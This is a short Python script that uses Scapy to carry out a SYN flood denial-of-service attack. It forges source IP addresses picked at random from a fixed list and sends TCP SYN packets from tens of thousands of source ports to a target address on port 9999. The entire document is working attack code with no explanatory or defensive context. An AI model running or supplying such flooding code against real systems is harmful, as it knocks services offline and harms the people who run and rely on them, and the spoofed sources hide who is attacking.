import random
from scapy.all import *
from scapy.layers.inet import IP, TCP


def synFlood(tgt, dPort):
    srcList = ['201.1.1.2', '10.1.1.102', '69.1.1.2', '125.130.5.199']
    for sPort in range(1024, 65535):
        index = random.randrange(4)
        ipLayer = IP(src=srcList[index], dst=tgt)
        tcpLayer = TCP(sport=sPort, dport=dPort, flags="S")
        packet = ipLayer / tcpLayer
        send(packet)


if __name__ == '__main__':
    synFlood("192.168.100.199", 9999)
